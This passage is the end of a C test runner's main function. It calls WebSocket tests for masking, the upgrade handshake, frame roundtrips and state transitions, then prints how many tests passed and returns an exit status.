    /* WebSocket masking tests */
    test_ws_apply_mask();

    /* WebSocket handshake tests */
    test_ws_build_upgrade_request();
    test_ws_validate_upgrade_response();

    /* WebSocket frame roundtrip tests */
    test_ws_frame_roundtrip();

    /* WebSocket state tests */
    test_ws_state_transitions();

    printf("\n===============================\n");
    printf("Results: %d/%d passed\n", tests_passed, tests_run);

    return (tests_passed == tests_run) ? 0 : 1;
}
